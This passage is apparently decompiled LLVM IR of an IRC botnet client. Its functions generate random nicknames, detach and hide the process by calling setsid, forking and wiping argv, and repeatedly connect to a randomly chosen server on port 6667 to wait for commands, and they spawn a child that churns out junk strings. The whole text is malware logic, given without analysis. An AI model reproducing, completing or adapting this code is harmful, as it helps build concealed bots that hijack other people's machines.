  ret i32 %v1_10012148
}

define i32 @_NICK(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  %v0_100121b43 = call i32 @__GI_strlen()
  %v2_100121bc5 = icmp eq i32 %v0_100121b43, 0
  br i1 %v2_100121bc5, label %dec_label_pc_100121e4, label %dec_label_pc_100121c4

dec_label_pc_100121a0:                            ; preds = %dec_label_pc_100121c4
  %v1_100121a4 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_100121b4 = call i32 @__GI_strlen()
  %v2_100121bc = icmp ult i32 %v1_100121a4, %v0_100121b4
  br i1 %v2_100121bc, label %dec_label_pc_100121c4, label %dec_label_pc_100121e4

dec_label_pc_100121c4:                            ; preds = %entry, %dec_label_pc_100121a0
  %storemerge28 = phi i32 [ %v1_100121a4, %dec_label_pc_100121a0 ], [ 0, %entry ]
  %v2_100121d0 = add i32 %storemerge28, %arg2
  %v1_100121d4 = inttoptr i32 %v2_100121d0 to i8*
  %v2_100121d4 = load i8, i8* %v1_100121d4, align 1
  %v3_100121dc = icmp eq i8 %v2_100121d4, 33
  br i1 %v3_100121dc, label %dec_label_pc_100121e4, label %dec_label_pc_100121a0

dec_label_pc_100121e4:                            ; preds = %entry, %dec_label_pc_100121a0, %dec_label_pc_100121c4
  %storemerge2.lcssa = phi i32 [ 0, %entry ], [ %v1_100121a4, %dec_label_pc_100121a0 ], [ %storemerge28, %dec_label_pc_100121c4 ]
  %v2_100121f0 = add i32 %storemerge2.lcssa, %arg2
  %v3_100121f8 = inttoptr i32 %v2_100121f0 to i8*
  store i8 0, i8* %v3_100121f8, align 1
  %v3_10012200 = load i32, i32* @global_var_10045178.64, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10012200, i32* @r4, align 4
  %v2_1001220c = call i32 @__GI_strcasecmp(i32 %arg2, i32 %v3_10012200)
  %v3_10012214 = icmp eq i32 %v2_1001220c, 0
  br i1 %v3_10012214, label %dec_label_pc_1001221c, label %dec_label_pc_10012280

dec_label_pc_1001221c:                            ; preds = %dec_label_pc_100121e4
  %v2_10012220 = load i8, i8* %arg3, align 1
  %v3_10012228 = icmp eq i8 %v2_10012220, 58
  br i1 %v3_10012228, label %dec_label_pc_10012230, label %dec_label_pc_1001223c

dec_label_pc_10012230:                            ; preds = %dec_label_pc_1001221c
  br label %dec_label_pc_1001223c

dec_label_pc_1001223c:                            ; preds = %dec_label_pc_1001221c, %dec_label_pc_10012230
  %v3_10012240 = load i32, i32* @global_var_10045178.64, align 4
  %v3_10012244 = icmp eq i32 %v3_10012240, 0
  br i1 %v3_10012244, label %dec_label_pc_1001225c, label %dec_label_pc_1001224c

dec_label_pc_1001224c:                            ; preds = %dec_label_pc_1001223c
  store i32 %v3_10012240, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001225c.930 to i32), i32* @lr, align 4
  %v0_10012258 = call i32 @free()
  br label %dec_label_pc_1001225c

dec_label_pc_1001225c:                            ; preds = %dec_label_pc_1001223c, %dec_label_pc_1001224c
  store i32 268509800, i32* @lr, align 4
  %v2_10012264 = call i32 @realrand(i32 4, i32 8)
  store i32 268509812, i32* @lr, align 4
  %v1_10012270 = call i32 @randstring(i32 %v2_10012264)
  store i32 %v1_10012270, i32* @global_var_10045178.64, align 4
  br label %dec_label_pc_10012280

dec_label_pc_10012280:                            ; preds = %dec_label_pc_100121e4, %dec_label_pc_1001225c
  %v0_10012298 = phi i32 [ %v2_1001220c, %dec_label_pc_100121e4 ], [ %v1_10012270, %dec_label_pc_1001225c ]
  ret i32 %v0_10012298

; uselistorder directives
  uselistorder i32 %v1_100121a4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10012280, { 1, 0 }
  uselistorder label %dec_label_pc_1001225c, { 1, 0 }
  uselistorder label %dec_label_pc_1001223c, { 1, 0 }
  uselistorder label %dec_label_pc_100121e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100121c4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 4, i32* %stack_var_-36, align 4
  %v3_100122c4 = load i32, i32* @global_var_1004517c.23, align 4
  %v2_100122c8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_100122cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 268509928, i32* @lr, align 4
  %v5_100122e4 = call i32 @getsockopt(i32 %v3_100122c4, i32 1, i32 4, i32 %v2_100122c8, i32 %v2_100122cc)
  %v3_100122f4 = icmp eq i32 %v5_100122e4, 0
  br i1 %v3_100122f4, label %dec_label_pc_100122fc, label %dec_label_pc_1001230c.preheader

dec_label_pc_100122fc:                            ; preds = %entry
  %v3_100122fc = load i32, i32* %stack_var_-40, align 4
  %v3_10012300 = icmp eq i32 %v3_100122fc, 0
  br i1 %v3_10012300, label %dec_label_pc_100125d8, label %dec_label_pc_1001230c.preheader

dec_label_pc_1001230c.preheader:                  ; preds = %entry, %dec_label_pc_100122fc
  %v2_1001242c = ptrtoint i32* %stack_var_-32 to i32
  %v2_10012430 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10012488 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_1001230c

dec_label_pc_1001230c:                            ; preds = %dec_label_pc_1001230c.backedge, %dec_label_pc_1001230c.preheader
  store i32 -1, i32* @global_var_1004517c.23, align 4
  store i32 1, i32* %stack_var_-16, align 4
  %v3_10012324 = load i32, i32* @global_var_1004514c.742, align 4
  %v3_10012328 = icmp eq i32 %v3_10012324, 0
  br i1 %v3_10012328, label %dec_label_pc_10012330, label %dec_label_pc_10012368

dec_label_pc_10012330:                            ; preds = %dec_label_pc_1001230c
  store i32 268510004, i32* @lr, align 4
  %v0_10012330 = call i32 @random()
  %v3_1001233c = load i32, i32* @global_var_10045098.931, align 4
  %v2_10012340 = srem i32 %v0_10012330, %v3_1001233c
  %v1_10012354 = mul i32 %v2_10012340, 4
  %v2_10012358 = add i32 %v1_10012354, ptrtoint ([14 x i8]** @global_var_1004509c.933 to i32)
  %v1_1001235c = inttoptr i32 %v2_10012358 to i32*
  %v2_1001235c = load i32, i32* %v1_1001235c, align 4
  store i32 %v2_1001235c, i32* @global_var_10045190.741, align 4
  br label %dec_label_pc_10012368

dec_label_pc_10012368:                            ; preds = %dec_label_pc_1001230c, %dec_label_pc_10012330
  store i32 0, i32* @global_var_1004514c.742, align 4
  br label %dec_label_pc_10012374

dec_label_pc_10012374:                            ; preds = %dec_label_pc_10012374, %dec_label_pc_10012368
  store i32 268510084, i32* @lr, align 4
  %v3_10012380 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_10012380, i32* @global_var_1004517c.23, align 4
  %v1_10012398 = icmp slt i32 %v3_10012380, 0
  br i1 %v1_10012398, label %dec_label_pc_10012374, label %dec_label_pc_100123a0

dec_label_pc_100123a0:                            ; preds = %dec_label_pc_10012374
  %v3_100123a4 = load i32, i32* @global_var_10045190.741, align 4
  store i32 268510128, i32* @lr, align 4
  %v1_100123ac = call i32 @inet_addr(i32 %v3_100123a4)
  %v3_100123b4 = icmp eq i32 %v1_100123ac, 0
  br i1 %v3_100123b4, label %dec_label_pc_100123dc, label %dec_label_pc_100123bc

dec_label_pc_100123bc:                            ; preds = %dec_label_pc_100123a0
  %v3_100123c0 = load i32, i32* @global_var_10045190.741, align 4
  store i32 268510156, i32* @lr, align 4
  %v1_100123c8 = call i32 @inet_addr(i32 %v3_100123c0)
  %v4_100123d4 = icmp eq i32 %v1_100123c8, -1
  br i1 %v4_100123d4, label %dec_label_pc_100123dc, label %dec_label_pc_10012450

dec_label_pc_100123dc:                            ; preds = %dec_label_pc_100123bc, %dec_label_pc_100123a0
  %v3_100123e0 = load i32, i32* @global_var_10045190.741, align 4
  store i32 268510188, i32* @lr, align 4
  %v1_100123e8 = call i32 @__GI_gethostbyname(i32 %v3_100123e0)
  %v3_100123f8 = icmp eq i32 %v1_100123e8, 0
  br i1 %v3_100123f8, label %dec_label_pc_10012400, label %dec_label_pc_10012420

dec_label_pc_10012400:                            ; preds = %dec_label_pc_100123dc
  store i32 0, i32* @global_var_10045190.741, align 4
  %v3_10012410 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 268510236, i32* @lr, align 4
  %v1_10012418 = call i32 @close(i32 %v3_10012410)
  br label %dec_label_pc_1001230c.backedge

dec_label_pc_1001230c.backedge:                   ; preds = %dec_label_pc_10012400, %dec_label_pc_100125b8
  br label %dec_label_pc_1001230c

dec_label_pc_10012420:                            ; preds = %dec_label_pc_100123dc
  %v1_10012424 = add i32 %v1_100123e8, 16
  %v2_10012424 = inttoptr i32 %v1_10012424 to i32*
  %v3_10012424 = load i32, i32* %v2_10012424, align 4
  %v1_10012428 = inttoptr i32 %v3_10012424 to i32*
  %v2_10012428 = load i32, i32* %v1_10012428, align 4
  %v1_10012438 = add i32 %v1_100123e8, 12
  %v2_10012438 = inttoptr i32 %v1_10012438 to i32*
  %v3_10012438 = load i32, i32* %v2_10012438, align 4
  store i32 %v3_10012438, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001244c.934 to i32), i32* @lr, align 4
  %v4_10012448 = call i32 @bcopy(i32 %v2_10012428, i32 %v2_10012430, i32 %v3_10012438, i32 %v1_100123e8)
  br label %dec_label_pc_10012468

dec_label_pc_10012450:                            ; preds = %dec_label_pc_100123bc
  %v3_10012454 = load i32, i32* @global_var_10045190.741, align 4
  store i32 268510304, i32* @lr, align 4
  %v1_1001245c = call i32 @inet_addr(i32 %v3_10012454)
  store i32 %v1_1001245c, i32* %stack_var_-28, align 4
  br label %dec_label_pc_10012468

dec_label_pc_10012468:                            ; preds = %dec_label_pc_10012420, %dec_label_pc_10012450
  store i32 2, i32* %stack_var_-32, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10012474 = call i32 @htons(i32 6667)
  %v3_10012484 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 %v3_10012484, i32* @r3, align 4
  store i32 -2147195266, i32* @r4, align 4
  store i32 %v2_10012488, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100124a4.935 to i32), i32* @lr, align 4
  %v0_100124a0 = call i32 @ioctl()
  store i32 268510380, i32* @lr, align 4
  %v1_100124a8 = call i32 @__GI_time(i32 0)
  store i32 268510624, i32* @lr, align 4
  %v1_1001259c15 = call i32 @__GI_time(i32 0)
  %v2_100125ac16 = sub i32 %v1_1001259c15, %v1_100124a8
  %tmp1420 = icmp ult i32 %v2_100125ac16, 10
  br i1 %tmp1420, label %dec_label_pc_100124b8, label %dec_label_pc_100125b8

dec_label_pc_100124b8:                            ; preds = %dec_label_pc_10012468, %dec_label_pc_10012590
  %v0_100124b8 = call i32 @__errno_location()
  %v2_100124c4 = inttoptr i32 %v0_100124b8 to i32*
  store i32 0, i32* %v2_100124c4, align 4
  %v3_100124cc = load i32, i32* @global_var_1004517c.23, align 4
  store i32 268510436, i32* @lr, align 4
  %v3_100124e0 = call i32 @connect(i32 %v3_100124cc, i32 %v2_1001242c, i32 16)
  %v3_100124e8 = icmp eq i32 %v3_100124e0, 0
  br i1 %v3_100124e8, label %dec_label_pc_10012504, label %dec_label_pc_100124f0

dec_label_pc_100124f0:                            ; preds = %dec_label_pc_100124b8
  %v0_100124f0 = call i32 @__errno_location()
  %v1_100124f8 = inttoptr i32 %v0_100124f0 to i32*
  %v2_100124f8 = load i32, i32* %v1_100124f8, align 4
  %v3_100124fc = icmp eq i32 %v2_100124f8, 106
  br i1 %v3_100124fc, label %dec_label_pc_10012504, label %dec_label_pc_10012568

dec_label_pc_10012504:                            ; preds = %dec_label_pc_100124f0, %dec_label_pc_100124b8
  %v3_10012508 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 268510500, i32* @lr, align 4
  %v5_10012520 = call i32 @__GI_setsockopt(i32 %v3_10012508, i32 1, i32 13, i32 0, i32 0)
  %v3_10012528 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 268510532, i32* @lr, align 4
  %v5_10012540 = call i32 @__GI_setsockopt(i32 %v3_10012528, i32 1, i32 2, i32 0, i32 0)
  %v3_10012548 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 ptrtoint (i32* @global_var_10012564.936 to i32), i32* @lr, align 4
  %v5_10012560 = call i32 @__GI_setsockopt(i32 %v3_10012548, i32 1, i32 9, i32 0, i32 0)
  br label %dec_label_pc_100125d8

dec_label_pc_10012568:                            ; preds = %dec_label_pc_100124f0
  %v0_10012568 = call i32 @__errno_location()
  %v1_10012570 = inttoptr i32 %v0_10012568 to i32*
  %v2_10012570 = load i32, i32* %v1_10012570, align 4
  %v3_10012574 = icmp eq i32 %v2_10012570, 115
  br i1 %v3_10012574, label %dec_label_pc_10012590, label %dec_label_pc_1001257c

dec_label_pc_1001257c:                            ; preds = %dec_label_pc_10012568
  %v0_1001257c = call i32 @__errno_location()
  %v1_10012584 = inttoptr i32 %v0_1001257c to i32*
  %v2_10012584 = load i32, i32* %v1_10012584, align 4
  %v3_10012588 = icmp eq i32 %v2_10012584, 114
  br i1 %v3_10012588, label %dec_label_pc_10012590, label %dec_label_pc_100125b8

dec_label_pc_10012590:                            ; preds = %dec_label_pc_1001257c, %dec_label_pc_10012568
  store i32 ptrtoint ([3 x i8]* @global_var_10012598.937 to i32), i32* @lr, align 4
  %v1_10012594 = call i32 @sleep(i32 1)
  store i32 268510624, i32* @lr, align 4
  %v1_1001259c = call i32 @__GI_time(i32 0)
  %v2_100125ac = sub i32 %v1_1001259c, %v1_100124a8
  %tmp14 = icmp ult i32 %v2_100125ac, 10
  br i1 %tmp14, label %dec_label_pc_100124b8, label %dec_label_pc_100125b8

dec_label_pc_100125b8:                            ; preds = %dec_label_pc_10012590, %dec_label_pc_1001257c, %dec_label_pc_10012468
  store i32 0, i32* @global_var_10045190.741, align 4
  %v3_100125c8 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 268510676, i32* @lr, align 4
  %v1_100125d0 = call i32 @close(i32 %v3_100125c8)
  br label %dec_label_pc_1001230c.backedge

dec_label_pc_100125d8:                            ; preds = %dec_label_pc_100122fc, %dec_label_pc_10012504
  %v0_100125ec = phi i32 [ 0, %dec_label_pc_100122fc ], [ %v5_10012560, %dec_label_pc_10012504 ]
  ret i32 %v0_100125ec

; uselistorder directives
  uselistorder i32 %v1_100124a8, { 1, 0 }
  uselistorder i32 %v3_10012438, { 1, 0 }
  uselistorder i32 %v1_100123e8, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 115, { 1, 0, 2, 3, 4 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @connect, { 8, 7, 6, 9, 1, 5, 4, 3, 2, 0 }
  uselistorder i32 268510624, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 64, 63, 62, 65, 61, 6, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 3, 2, 1, 0, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100125d8, { 1, 0 }
  uselistorder label %dec_label_pc_100124b8, { 1, 0 }
  uselistorder label %dec_label_pc_10012468, { 1, 0 }
  uselistorder label %dec_label_pc_1001230c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012368, { 1, 0 }
  uselistorder label %dec_label_pc_1001230c.preheader, { 1, 0 }
}

define i32 @makeFukdString(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268510744, i32* @lr, align 4
  %v1_10012614 = call i32 @__GI_time(i32 0)
  store i32 %v1_10012614, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012624.938 to i32), i32* @lr, align 4
  %v1_10012620 = call i32 @srand(i32 %v1_10012614)
  store i32 %v1_10012620, i32* %r3.global-to-local, align 4
  %v2_100126a82 = icmp sgt i32 %arg2, 0
  br i1 %v2_100126a82, label %dec_label_pc_10012638, label %dec_label_pc_100126b0

dec_label_pc_10012638:                            ; preds = %entry, %dec_label_pc_10012638
  %storemerge15 = phi i32 [ %v1_10012698, %dec_label_pc_10012638 ], [ 0, %entry ]
  store i32 268510796, i32* @lr, align 4
  %v0_10012648 = call i32 @random()
  store i32 %v0_10012648, i32* %r3.global-to-local, align 4
  %v2_10012668 = srem i32 %v0_10012648, 223
  %fold = add nsw i32 %v2_10012668, 33
  %v1_10012690 = trunc i32 %fold to i8
  %v2_10012690 = load i32, i32* @r29, align 4
  %v3_10012690 = inttoptr i32 %v2_10012690 to i8*
  store i8 %v1_10012690, i8* %v3_10012690, align 1
  %v1_10012698 = add nuw nsw i32 %storemerge15, 1
  %v2_100126a8 = icmp slt i32 %v1_10012698, %arg2
  br i1 %v2_100126a8, label %dec_label_pc_10012638, label %dec_label_pc_100126a0.dec_label_pc_100126b0_crit_edge

dec_label_pc_100126a0.dec_label_pc_100126b0_crit_edge: ; preds = %dec_label_pc_10012638
  %v0_100126c8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100126b0

dec_label_pc_100126b0:                            ; preds = %dec_label_pc_100126a0.dec_label_pc_100126b0_crit_edge, %entry
  %v0_100126c8 = phi i32 [ %v0_100126c8.pre, %dec_label_pc_100126a0.dec_label_pc_100126b0_crit_edge ], [ %v1_10012620, %entry ]
  ret i32 %v0_100126c8

; uselistorder directives
  uselistorder i32 %v1_10012698, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10012638, { 1, 0 }
}

define i32 @touchMyself(i32* %arg1) local_unnamed_addr {
entry:
  store i32 268510956, i32* @lr, align 4
  %v0_100126e8 = call i32 @fork()
  %v3_100126f0 = icmp eq i32 %v0_100126e8, 0
  br i1 %v3_100126f0, label %dec_label_pc_100126f8, label %dec_label_pc_10012734

dec_label_pc_100126f8:                            ; preds = %entry, %dec_label_pc_100126f8
  store i32 268510980, i32* @lr, align 4
  %v0_10012700 = call i32 @random()
  %v2_10012714 = urem i32 %v0_10012700, 128
  %v1_10012718 = or i32 %v2_10012714, 1024
  %v0_1001271c = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012728.939 to i32), i32* @lr, align 4
  %v3_10012724 = call i32 @makeFukdString(i32 %v0_1001271c, i32 %v1_10012718, i32 %v2_10012714)
  store i32 268511024, i32* @lr, align 4
  %v1_1001272c = call i32 @sleep(i32 3)
  br label %dec_label_pc_100126f8

dec_label_pc_10012734:                            ; preds = %entry
  ret i32 %v0_100126e8

; uselistorder directives
  uselistorder label %dec_label_pc_100126f8, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-6180 = alloca i32, align 4
  %stack_var_-5156 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-6316 = alloca i32, align 4
  %stack_var_-6616 = alloca i32, align 4
  %stack_var_-6308 = alloca i32, align 4
  %stack_var_-20 = alloca i8**, align 4
  store i8** %argv, i8*** %stack_var_-20, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012774.940 to i32), i32* @lr, align 4
  %v0_10012770 = call i32 @__GI_setsid()
  store i32 ptrtoint (i32* @global_var_10012780.941 to i32), i32* @lr, align 4
  %v2_1001277c = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 268511108, i32* @lr, align 4
  %v0_10012780 = call i32 @fork()
  %v3_10012788 = icmp eq i32 %v0_10012780, 0
  br i1 %v3_10012788, label %dec_label_pc_10012f54, label %dec_label_pc_10012790

dec_label_pc_10012790:                            ; preds = %entry
  store i32 268511132, i32* @lr, align 4
  %v1_10012798 = bitcast i8*** %stack_var_-20 to i32*
  %v2_10012798 = call i32 @touchMyself(i32* %v1_10012798)
  store i32 1936027248, i32* @r10, align 4
  store i32 1634290035, i32* @r8, align 4
  store i32 1265990245, i32* @global_var_1004db50.77, align 4
  store i8* inttoptr (i32 1936027248 to i8*), i8** @global_var_1004db54.946, align 4
  store i8* inttoptr (i32 1634290035 to i8*), i8** @global_var_1004db58.947, align 4
  store i8* inttoptr (i32 1500476786 to i8*), i8** @global_var_1004db5c.948, align 4
  store i8* inttoptr (i32 1198482432 to i8*), i8** @global_var_1004db60.950, align 4
  %v2_1001284048 = icmp sgt i32 %argc, 1
  br i1 %v2_1001284048, label %dec_label_pc_100127e0, label %dec_label_pc_10012848

dec_label_pc_100127e0:                            ; preds = %dec_label_pc_10012790, %dec_label_pc_100127e0
  %storemerge1151 = phi i32 [ %v1_10012830, %dec_label_pc_100127e0 ], [ 1, %dec_label_pc_10012790 ]
  %v1_100127e4 = mul i32 %storemerge1151, 4
  %v3_100127ec = load i8**, i8*** %stack_var_-20, align 4
  %v4_100127ec = ptrtoint i8** %v3_100127ec to i32
  %v2_100127f0 = add i32 %v4_100127ec, %v1_100127e4
  %v1_100127f4 = inttoptr i32 %v2_100127f0 to i32*
  %v2_100127f4 = load i32, i32* %v1_100127f4, align 4
  store i32 %v2_100127f4, i32* @r3, align 4
  %v0_10012814 = call i32 @__GI_strlen()
  store i32 %v2_100127f4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v0_10012814, i32* @r5, align 4
  store i32 268511276, i32* @lr, align 4
  %v0_10012828 = call i32 @__GI_memset()
  %v1_10012830 = add nuw nsw i32 %storemerge1151, 1
  %v2_10012840 = icmp slt i32 %v1_10012830, %argc
  br i1 %v2_10012840, label %dec_label_pc_100127e0, label %dec_label_pc_10012848

dec_label_pc_10012848:                            ; preds = %dec_label_pc_100127e0, %dec_label_pc_10012790
  store i32 268511312, i32* @lr, align 4
  %v1_1001284c = call i32 @__GI_time(i32 0)
  store i32 268511320, i32* @lr, align 4
  %v0_10012854 = call i32 @__libc_getpid()
  %v2_1001285c = xor i32 %v1_1001284c, %v0_10012854
  store i32 268511332, i32* @lr, align 4
  %v0_10012860 = call i32 @getppid()
  %v2_10012868 = add i32 %v2_1001285c, %v0_10012860
  store i32 ptrtoint ([3 x i8]* @global_var_10012874.951 to i32), i32* @lr, align 4
  %v1_10012870 = call i32 @srand(i32 %v2_10012868)
  store i32 268511360, i32* @lr, align 4
  %v2_1001287c = call i32 @realrand(i32 4, i32 8)
  store i32 268511372, i32* @lr, align 4
  %v1_10012888 = call i32 @randstring(i32 %v2_1001287c)
  store i32 %v1_10012888, i32* @global_var_10045178.64, align 4
  store i32 268511396, i32* @lr, align 4
  %v2_100128a0 = call i32 @realrand(i32 4, i32 8)
  store i32 268511408, i32* @lr, align 4
  %v1_100128ac = call i32 @randstring(i32 %v2_100128a0)
  store i32 %v1_100128ac, i32* @global_var_10045170.31, align 4
  store i32 268511432, i32* @lr, align 4
  %v2_100128c4 = call i32 @realrand(i32 4, i32 8)
  store i32 268511444, i32* @lr, align 4
  %v1_100128d0 = call i32 @randstring(i32 %v2_100128c4)
  store i32 %v1_100128d0, i32* @global_var_10045188.952, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002e060.953 to i32), i32* @global_var_100451a4.544, align 4
  store i32 ptrtoint (i32* @global_var_1002e068.954 to i32), i32* @global_var_1004519c.920, align 4
  store i32 0, i32* @global_var_10045190.741, align 4
  %v2_1001296c = ptrtoint i32* %stack_var_-6308 to i32
  %v2_100129c4 = ptrtoint i32* %stack_var_-6616 to i32
  %v2_100129c8 = add i32 %v2_100129c4, 308
  %v2_10012a20 = ptrtoint i32* %stack_var_-6316 to i32
  %v2_10012c34 = ptrtoint i32* %stack_var_-4132 to i32
  %v2_10012d20 = ptrtoint i32* %stack_var_-5156 to i32
  %v2_10012dc8 = ptrtoint i32* %stack_var_-6180 to i32
  %v2_10012c68 = add i32 %v2_100129c4, 2484
  br label %dec_label_pc_10012910

dec_label_pc_10012910:                            ; preds = %dec_label_pc_10012efc, %dec_label_pc_10012c2c, %dec_label_pc_100129b0, %dec_label_pc_10012848
  %v0_10012910 = call i32 @con()
  %v3_10012918 = load i32, i32* @global_var_1004517c.23, align 4
  %v2_1001291c = call i32 @getBuild(i32 %v0_10012910)
  %v3_10012930 = load i32, i32* @global_var_10045188.952, align 4
  store i32 %v3_10012930, i32* @r8, align 4
  %v9_10012964 = call i32 @Send(i32 %v3_10012918, i32 ptrtoint ([48 x i8]* @global_var_1002e06c.955 to i32), i32 ptrtoint ([8 x i8]* @global_var_1002a3d4.67 to i32), i32 %v2_1001291c)
  br label %dec_label_pc_1001296c

dec_label_pc_1001296c:                            ; preds = %dec_label_pc_10012bec, %dec_label_pc_10012c60, %dec_label_pc_10012f18, %dec_label_pc_10012f3c, %dec_label_pc_10012910
  br label %dec_label_pc_10012980

dec_label_pc_10012980:                            ; preds = %dec_label_pc_1001296c, %dec_label_pc_10012980
  %storemerge1223 = phi i32 [ 0, %dec_label_pc_1001296c ], [ %v1_1001299c, %dec_label_pc_10012980 ]
  %v1_10012988 = mul nuw nsw i32 %storemerge1223, 4
  %v2_1001298c = add i32 %v1_10012988, %v2_1001296c
  %v2_10012994 = inttoptr i32 %v2_1001298c to i32*
  store i32 0, i32* %v2_10012994, align 4
  %v1_1001299c = add nuw nsw i32 %storemerge1223, 1
  %tmp73 = icmp ult i32 %v1_1001299c, 32
  br i1 %tmp73, label %dec_label_pc_10012980, label %dec_label_pc_100129b0

dec_label_pc_100129b0:                            ; preds = %dec_label_pc_10012980
  %v3_100129b4 = load i32, i32* @global_var_1004517c.23, align 4
  %v1_100129b8 = udiv i32 %v3_100129b4, 32
  store i32 %v1_100129b8, i32* @r10, align 4
  %v1_100129c0 = mul nuw nsw i32 %v1_100129b8, 4
  %v1_100129cc = add i32 %v1_100129c0, %v2_100129c8
  %v1_100129d0 = inttoptr i32 %v1_100129cc to i32*
  %v2_100129d0 = load i32, i32* %v1_100129d0, align 4
  %v1_100129dc = urem i32 %v3_100129b4, 32
  %v3_100129e4 = shl i32 1, %v1_100129dc
  %v2_100129e8 = or i32 %v2_100129d0, %v3_100129e4
  store i32 %v2_100129e8, i32* %v1_100129d0, align 4
  store i32 1200, i32* %stack_var_-6316, align 4
  %v3_10012a14 = load i32, i32* @global_var_1004517c.23, align 4
  %v1_10012a18 = add i32 %v3_10012a14, 1
  store i32 268511804, i32* @lr, align 4
  %v5_10012a38 = call i32 @__libc_select(i32 %v1_10012a18, i32 %v2_1001296c, i32 0, i32 0, i32 %v2_10012a20)
  %tmp74 = icmp slt i32 %v5_10012a38, 1
  br i1 %tmp74, label %dec_label_pc_10012910, label %dec_label_pc_10012bd8.preheader

dec_label_pc_10012bd8.preheader:                  ; preds = %dec_label_pc_100129b0
  %v3_10012bdc28 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012be429 = icmp eq i32 %v3_10012bdc28, 0
  br i1 %v2_10012be429, label %dec_label_pc_10012bec, label %dec_label_pc_10012a54

dec_label_pc_10012a54:                            ; preds = %dec_label_pc_10012bd8.preheader, %dec_label_pc_10012bcc
  %storemerge1331 = phi i32 [ %.pre, %dec_label_pc_10012bcc ], [ 0, %dec_label_pc_10012bd8.preheader ]
  %v1_10012a58 = mul i32 %storemerge1331, 4
  %v3_10012a64 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_10012a68 = add i32 %v3_10012a64, %v1_10012a58
  %v1_10012a6c = inttoptr i32 %v2_10012a68 to i32*
  %v2_10012a6c = load i32, i32* %v1_10012a6c, align 4
  store i32 268511872, i32* @lr, align 4
  %v3_10012a7c = call i32 @waitpid(i32 %v2_10012a6c, i32 0, i32 1)
  %tmp75 = icmp slt i32 %v3_10012a7c, 1
  %.pre = add i32 %storemerge1331, 1
  br i1 %tmp75, label %dec_label_pc_10012bcc, label %dec_label_pc_10012ae4.preheader

dec_label_pc_10012ae4.preheader:                  ; preds = %dec_label_pc_10012a54
  %v3_10012ae878 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012af079 = icmp ult i32 %.pre, %v3_10012ae878
  %v1_10012aa080 = mul i32 %.pre, 4
  %v3_10012aac81 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_10012ab082 = add i32 %v3_10012aac81, %v1_10012aa080
  br i1 %v2_10012af079, label %dec_label_pc_10012a9c, label %dec_label_pc_10012af8

dec_label_pc_10012a9c:                            ; preds = %dec_label_pc_10012ae4.preheader, %dec_label_pc_10012a9c
  %v2_10012ab086 = phi i32 [ %v2_10012ab0, %dec_label_pc_10012a9c ], [ %v2_10012ab082, %dec_label_pc_10012ae4.preheader ]
  %v1_10012a9083 = phi i32 [ %v1_10012a90, %dec_label_pc_10012a9c ], [ %.pre, %dec_label_pc_10012ae4.preheader ]
